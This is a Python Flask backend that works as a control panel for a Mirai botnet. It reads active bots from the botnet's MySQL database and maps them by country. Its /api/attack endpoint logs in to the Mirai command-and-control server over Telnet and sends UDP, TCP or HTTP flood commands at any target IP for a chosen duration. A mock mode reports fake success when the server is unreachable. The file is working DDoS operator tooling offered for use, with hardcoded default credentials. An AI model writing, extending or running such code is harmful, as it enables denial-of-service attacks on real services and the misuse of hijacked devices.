import telnetlib
import pymysql
from flask import Flask, jsonify, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)

# --- Configuration ---
MYSQL_HOST = "127.0.0.1"
MYSQL_USER = "root"
MYSQL_PASSWORD = "password123"
MYSQL_DB = "mirai"

C2_HOST = "127.0.0.1"
C2_PORT = 23  # Change to your Mirai CNC port
C2_USER = "admin"
C2_PASS = "admin"

# --- IP to Country Helper ---
def get_country_from_ip(ip):
    if ip.startswith("110.164.20."):
        return "Thailand"
    elif ip.startswith("66.249.64."):
        return "USA"
    elif ip.startswith("122.211.0."):
        return "Japan"
    return "Unknown"

# --- Mock Data for Testing (When databases/C2 are offline) ---
MOCK_BOTS = [
    {"ip": "110.164.20.11", "country": "Thailand", "flag": "🇹🇭", "status": "Connected"},
    {"ip": "110.164.20.12", "country": "Thailand", "flag": "🇹🇭", "status": "Connected"},
    {"ip": "66.249.64.11", "country": "USA", "flag": "🇺🇸", "status": "Connected"},
    {"ip": "66.249.64.12", "country": "USA", "flag": "🇺🇸", "status": "Connected"},
    {"ip": "122.211.0.11", "country": "Japan", "flag": "🇯🇵", "status": "Connected"}
]

@app.route('/api/status', methods=['GET'])
def get_status():
    """Fetches active bots and maps them by country."""
    try:
        connection = pymysql.connect(
            host=MYSQL_HOST,
            user=MYSQL_USER,
            password=MYSQL_PASSWORD,
            database=MYSQL_DB,
            cursorclass=pymysql.cursors.DictCursor
        )
        with connection:
            with connection.cursor() as cursor:
                # Query active bots from Mirai DB (adjust table/fields as necessary)
                cursor.execute("SELECT ip FROM bots WHERE last_active > NOW() - INTERVAL 5 MINUTE")
                rows = cursor.fetchall()
                
                bots_list = []
                for r in rows:
                    country = get_country_from_ip(r['ip'])
                    flags = {"Thailand": "🇹🇭", "USA": "🇺🇸", "Japan": "🇯🇵", "Unknown": "🏴‍☠️"}
                    bots_list.append({
                        "ip": r['ip'],
                        "country": country,
                        "flag": flags.get(country, "🏴‍☠️"),
                        "status": "Connected"
                    })
                return jsonify({"status": "success", "mode": "production", "bots": bots_list})
    except Exception:
        # Fallback to mock data if MySQL is not available (useful for offline demonstration/dev)
        return jsonify({"status": "success", "mode": "mock", "bots": MOCK_BOTS})

@app.route('/api/attack', methods=['POST'])
def trigger_attack():
    """Sends a DDoS command to the Mirai C2 server via Telnet."""
    data = request.json or {}
    target_ip = data.get("target_ip")
    target_name = data.get("target_name", "Target")
    attack_type = data.get("attack_type", "udp")  # e.g., udp, tcp, http
    duration = data.get("duration", 60)
    
    if not target_ip:
        return jsonify({"status": "error", "message": "Missing target_ip"}), 400

    # Build the C2 command string
    # Format typically: [attack_type] [target_ip] [duration] dport=80
    command = f"{attack_type} {target_ip} {duration} dport=80\n"

    try:
        # Attempt connection to Mirai C2 Telnet
        tn = telnetlib.Telnet(C2_HOST, C2_PORT, timeout=5)
        tn.read_until(b"username: ", timeout=2)
        tn.write(C2_USER.encode('ascii') + b"\n")
        tn.read_until(b"password: ", timeout=2)
        tn.write(C2_PASS.encode('ascii') + b"\n")
        
        # Send attack command
        tn.write(command.encode('ascii'))
        tn.close()
        
        return jsonify({
            "status": "success",
            "mode": "production",
            "message": f"Successfully sent {attack_type.upper()} attack command targeting {target_name} ({target_ip}) for {duration}s."
        })
    except Exception as e:
        # Mock mode fallback (pretends to successfully launch attack for GUI simulation)
        return jsonify({
            "status": "success",
            "mode": "mock",
            "message": f"[MOCK] Simulated {attack_type.upper()} command sent to C2 targeting {target_name} ({target_ip}) for {duration}s."
        })

if __name__ == '__main__':
    # Runs backend on port 5000
    app.run(host='0.0.0.0', port=5000, debug=True)
